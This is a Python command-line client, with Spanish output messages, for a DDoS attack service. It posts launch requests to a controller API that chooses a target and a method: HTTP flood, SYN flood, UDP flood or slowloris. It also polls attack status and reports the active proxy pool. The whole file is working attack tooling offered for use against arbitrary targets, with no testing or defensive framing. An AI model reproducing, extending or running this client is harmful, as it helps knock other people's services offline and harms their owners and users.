import argparse
import requests
import time
import json
from urllib.parse import urlparse

class DDoSClient:
    def __init__(self, api_url="http://localhost:8000"):
        self.api_url = api_url
        self.token = None
    
    def launch_attack(self, target, attack_type, duration=300, intensity=1000):
        attack_url = f"{self.api_url}/api/v1/attack"
        headers = {
            "Content-Type": "application/json"
        }
        data = {
            "target": target,
            "attack_type": attack_type,
            "duration": duration,
            "intensity": intensity
        }
        
        try:
            response = requests.post(attack_url, headers=headers, json=data)
            if response.status_code == 200:
                result = response.json()
                attack_id = result.get("attack_id")
                print(f"[+] Ataque lanzado: {attack_id}")
                return attack_id
            else:
                print(f"[-] Error: {response.status_code} - {response.text}")
                return None
        except Exception as e:
            print(f"[-] Error de conexión: {e}")
            return None
    
    def get_attack_status(self, attack_id):
        status_url = f"{self.api_url}/api/v1/attack/{attack_id}"
        
        try:
            response = requests.get(status_url)
            if response.status_code == 200:
                return response.json()
            else:
                print(f"[-] Error: {response.status_code}")
                return None
        except Exception as e:
            print(f"[-] Error de conexión: {e}")
            return None
    
    def list_attacks(self):
        list_url = f"{self.api_url}/api/v1/attacks"
        
        try:
            response = requests.get(list_url)
            if response.status_code == 200:
                return response.json()
            else:
                print(f"[-] Error: {response.status_code}")
                return None
        except Exception as e:
            print(f"[-] Error de conexión: {e}")
            return None
    
    def get_stats(self):
        stats_url = f"{self.api_url}/api/v1/stats"
        
        try:
            response = requests.get(stats_url)
            if response.status_code == 200:
                return response.json()
            else:
                print(f"[-] Error: {response.status_code}")
                return None
        except Exception as e:
            print(f"[-] Error de conexión: {e}")
            return None

def main():
    parser = argparse.ArgumentParser(description="DDoS Client")
    parser.add_argument("-a", "--api", default="http://localhost:8000", help="server")
    parser.add_argument("-t", "--target", required=True, help="Objetivo")
    parser.add_argument("-m", "--method", choices=["http_flood", "syn_flood", "udp_flood", "slowloris"], 
                        default="http_flood", help="Método")
    parser.add_argument("-d", "--duration", type=int, default=300, help="Duración")
    parser.add_argument("-i", "--intensity", type=int, default=1000, help="Intensidad")
    parser.add_argument("--monitor", action="store_true", help="Monitorear")
    
    args = parser.parse_args()
    
    client = DDoSClient(args.api)
    
    stats = client.get_stats()
    if stats:
        print(f"\n[+] Estadísticas:")
        print(f"    Ataques activos: {stats['active_attacks']}")
        print(f"    Proxies totales: {stats['proxies']['total_proxies']}")
        print(f"    Proxies activos: {stats['proxies']['active_proxies']}")
    
    attack_id = client.launch_attack(args.target, args.method, args.duration, args.intensity)
    
    if attack_id and args.monitor:
        print(f"\n[+] Monitoreando ataque {attack_id}...")
        while True:
            status = client.get_attack_status(attack_id)
            if not status:
                break
            
            print(f"    Estado: {status['status']}")
            print(f"    Tipo: {status['type']}")
            print(f"    Objetivo: {status['target']}")
            print(f"    Inicio: {time.ctime(status['start_time'])}")
            print(f"    Duración: {status['duration']}s")
            print(f"    Intensidad: {status['intensity']}")
            
            if status['status'] in ['completed', 'failed']:
                print(f"[+] Ataque {status['status']}")
                break
            
            time.sleep(5)

if __name__ == "__main__":
    main()